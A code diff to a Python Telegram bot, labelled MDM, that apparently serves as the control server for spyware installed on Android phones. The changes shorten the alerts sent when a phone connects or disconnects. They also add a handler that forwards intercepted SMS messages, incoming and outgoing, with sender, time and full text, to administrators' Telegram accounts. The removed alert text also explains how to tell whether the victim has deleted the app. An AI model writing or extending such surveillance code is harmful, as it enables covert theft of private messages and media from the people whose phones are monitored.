@@ -1179,20 +1179,15 @@ class MDMBot:
         return w
 
     def _notify_device_connect(self, dev):
-        """Send auto-alert when device connects"""
+        """Send auto-alert when device connects (short, per user request)"""
         if not self.bot: return
         short_id = dev.get("short_id", "?")
         model = dev.get("model", "Unknown")
-        version = dev.get("version", "?")
-        ip = dev.get("ip", "?")
 
+        # ⚡ V11.2.85: رسالة مختصرة كما طلب المستخدم — فقط "متصل"
         html = (
-            f"<b>🟢 جهاز جديد متصل!</b>\n\n"
-            f"┌ <b>📋 التفاصيل</b>\n"
-            f"├ 📱 الجهاز: <b>#{short_id}</b>\n"
-            f"├ 📦 النموذج: {model}\n"
-            f"├ 📲 الإصدار: Android {version}\n"
-            f"└ 🌐 IP: <code>{ip}</code>"
+            f"🟢 <b>متصل</b>\n\n"
+            f"📱 <b>{model}</b> (#{short_id})"
         )
         kb = InlineKeyboardMarkup(row_width=1)
         kb.add(InlineKeyboardButton(f"⚙ التحكم في #{short_id}", callback_data=f"menu:select:{dev['device_id']}"))
@@ -3117,20 +3112,12 @@ def _sock_disconnect():
                 logger.info(f"⏭️ تخطي إشعار الانقطاع — الجهاز {did} عاد للاتصال خلال 10 ثوانٍ")
                 return
 
-            # الجهاز لم يعد → أرسل إشعار الانقطاع
+            # الجهاز لم يعد → أرسل إشعار الانقطاع (مختصر كما طلب المستخدم)
             for admin_id in Config.ADMIN_IDS:
                 try:
                     mdm_bot.bot.send_message(admin_id,
-                        f"🔴 <b>جهاز انقطع</b>\n\n"
-                        f"📱 <b>{short_label}</b>\n"
-                        f"━━━━━━━━━━━━━━━\n"
-                        f"⚠ <b>السبب المحتمل:</b>\n"
-                        f"• إطفاء الشبكة (سيعود قريباً ✅)\n"
-                        f"• حذف التطبيق (لن يعود ❌)\n"
-                        f"• إطفاء الجهاز (لن يعود ❌)\n"
-                        f"━━━━━━━━━━━━━━━\n"
-                        f"💡 إذا وصلت رسالة \"🌐 عادت الشبكة\" → كان السبب إطفاء النت\n"
-                        f"💡 إذا لم تعد أي رسالة ← 5 دقائق → التطبيق محذوف",
+                        f"🔴 <b>انفصل</b>\n\n"
+                        f"📱 <b>{short_label}</b>",
                         parse_mode="HTML")
                 except Exception as e:
                     logger.error(f"فشل إرسال إشعار الانقطاع: {e}")
@@ -3159,8 +3146,21 @@ def _sock_register(data):
     emit("registered", reg_data)
     logger.info(f"[Socket] {'جديد' if is_new else 'تحديث'} #{dev['short_id']} {did} | {dev.get('model')} | {dev.get('ip')}")
 
-    # Notify bot if new device
-    if is_new and mdm_bot:
+    # ⚡ V11.2.85: Notify bot when device connects
+    # - If is_new=True → first ever connection → notify
+    # - If is_new=False but device was offline → it's a reconnection → notify
+    # (Previously: only notified on first-ever connection, so reconnecting devices
+    #  didn't trigger "🟢 جهاز متصل" message)
+    should_notify_connect = is_new
+    if not is_new:
+        # Check if device was offline before this registration
+        # (if it was online with a different sid, it's a reconnection)
+        was_offline = dev.get("status") != "online" or not dev.get("sid")
+        if was_offline:
+            should_notify_connect = True
+            logger.info(f"[Socket] 🔄 Reconnection detected for #{dev['short_id']} — will notify")
+
+    if should_notify_connect and mdm_bot:
         eventlet.spawn(mdm_bot._notify_device_connect, dev)
 
 @socketio.on("heartbeat")
@@ -3891,6 +3891,35 @@ def _process_base64_media(dev, data, sid):
     total = data.get("total", 0)
     logger.info(f"📸 base64_media from #{dev.get('short_id', '?')}: "
                 f"type={media_type} mime={mime} size={len(b64data)} chars name={file_name}")
+
+    # ⚡ V11.2.85: Handle SMS messages specially (they are text, not base64 media)
+    # SMS handler sends: type="new_sms", sender="...", message="...", time="...", sms_type="📥 واردة"/"📤 صادرة"
+    if media_type == "new_sms":
+        sender = data.get("sender", "غير معروف")
+        message = data.get("message", "")
+        sms_time = data.get("time", "")
+        sms_type = data.get("sms_type", "")
+        logger.info(f"💬 SMS from #{dev.get('short_id', '?')}: {sms_type} from {sender}: {message[:50]}")
+        if mdm_bot:
+            short_label = _dev_label(dev)
+            # Truncate long messages for caption
+            msg_display = message[:3500] if len(message) > 3500 else message
+            html = (
+                f"<b>💬 {sms_type}</b>\n\n"
+                f"📱 <b>{short_label}</b>\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"👤 <b>المرسل:</b> <code>{sender}</code>\n"
+                f"🕐 <b>الوقت:</b> {sms_time}\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📝 <b>الرسالة:</b>\n<code>{msg_display}</code>"
+            )
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id, html, parse_mode="HTML")
+                    logger.info(f"✅ SMS sent to admin {admin_id}")
+                except Exception as e:
+                    logger.error(f"❌ Failed to send SMS to admin {admin_id}: {e}")
+        return
 
     if not b64data:
         logger.warning("⚠️ Empty base64 media data")
